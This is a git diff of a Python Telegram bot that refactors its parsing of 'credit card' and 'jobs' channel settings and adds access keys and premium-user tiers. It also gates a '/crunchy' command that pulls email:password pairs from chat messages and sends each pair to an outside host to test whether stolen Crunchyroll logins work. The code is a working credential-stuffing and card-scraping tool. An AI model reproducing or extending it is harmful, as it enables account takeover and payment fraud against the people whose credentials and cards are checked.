@@ -81,29 +81,28 @@ def isApprovedCreditCard(cc):
     return False
 
 
+def filter_env(list):
+    final = []
+    for x in list:
+        x = x.strip()
+        if "-" in x:
+            final.append(int(x))
+        elif "" == x:
+            pass
+        else:
+            final.append(x)
+
 # Filter Jobs Channels
-fuel_jobs = []
-jobs = os.environ.get("JOBS").split(",")
-for job in jobs:
-    job = job.strip()
-    if "-" in job:
-        fuel_jobs.append(int(job))
-    elif "" == job:
-        pass
-    else:
-        fuel_jobs.append(job)
+fuel_jobs = filter_env(os.environ.get("JOBS_SOURCE").split(","))
 
 # Filter CC Channels
-fuel_credit_card = []
-cc = os.environ.get("CC").split(",")
-for c in cc:
-    c = c.strip()
-    if "-" in c:
-        fuel_credit_card.append(int(c))
-    elif "" == c:
-        pass
-    else:
-        fuel_credit_card.append(c)
+fuel_credit_card = filter_env(os.environ.get("CC_SOURCE").split(","))
+
+# List of premium users
+premium_users = filter_env(os.environ.get("PUSERS").split(","))
+
+# Access key
+ACCESS_KEY = os.environ.get("ACCESS_KEY").strip()
 
 # Filter Credit Cards From Each Message.
 def filter_pattern(message):
@@ -250,26 +249,44 @@ def main():
         @client.on(events.NewMessage(pattern=r"^(?:@xCatBurglar /crunchy|/crunchy)"))
         async def handler(event):
             results = findall(r"([a-zA-Z0-9_\-\.]+@.*)\:(.*)", event.raw_text)
-            print(results)
+            key = findall(r"ACCESS [A-Z0-9]{16}", event.raw_text)
+            haveKey = False
+            if len(key) == 1:
+                key = key[0]
+                if key == ACCESS_KEY:
+                    haveKey = True
+            # Getting the sender infor to extract the username
+                user = await event.get_sender()
+                user = user.username
+            # Membership status
+            membership = "𝙵𝚁𝙴𝙴"
+            # Setting membership status based on the who accesses it
+            if user == "x4rju9":
+                membership = "𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁"
+            elif user in premium_users:
+                membership = "𝙿𝚁𝙴𝙼𝙸𝚄𝙼"
+            elif haveKey:
+                membership = "ᴀᴜᴛʜ"
             if not len(results) >= 1:
                 return
+            if len(results) > 1:
+                if not user in premium_users and not haveKey:
+                    res = f"""
+                    [✯] 𝗖𝗥𝗨𝗡𝗖𝗛𝗬𝗥𝗢𝗟𝗟 ⚡ 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 
+                    ━━━━━━━━━━━━━━━━
+                    [✯] **ʀᴇꜱᴘᴏɴꜱᴇ** ↯ `ᴀᴄᴄᴇꜱꜱ ᴅᴇɴɪᴇᴅ ‼`
+                    [✯] **ᴍᴇꜱꜱᴀɢᴇ** ↯ `ɴᴏ ᴀᴄᴄᴇꜱꜱ ᴋᴇʏ ꜰᴏᴜɴᴅ ‼`
+                    ━━━━━━━━━━━━━━━━
+                    [✯] **ᴘʀᴏxʏ** ↯ ʟɪᴠᴇ ☘️
+                    [✯] **ᴄʜᴇᴄᴋᴇᴅ ʙʏ** ↯ @{user} [{membership}]
+                    [✯] **ᴅᴇᴠᴇʟᴏᴘᴇᴅ ʙʏ** ↯ @x4rju9 ⚜️"""
+                    res = formatMessage(res)
+                    await event.reply(res)
+                    return
             for result in results:
-                print(result)
                 url = f"https://daydreamerwalk.com/c.php?e={result[0]}&p={result[1]}"
                 # Response from the server
                 response = requests.post(url=url)
-                # List of premium users
-                premium_users = ["x4rju9"]
-                # Membership status
-                memebership = "𝙵𝚁𝙴𝙴"
-                # Getting the sender infor to extract the username
-                user = await event.get_sender()
-                user = user.username
-                # Setting membership status based on the who accesses it
-                if user == "x4rju9":
-                    memebership = "𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁"
-                elif user in premium_users:
-                    memebership = "𝙿𝚁𝙴𝙼𝙸𝚄𝙼"
                 # Password security: whether to hide or not
                 uPass = result[1]
                 # Response of whether the credentials are valid or invalid
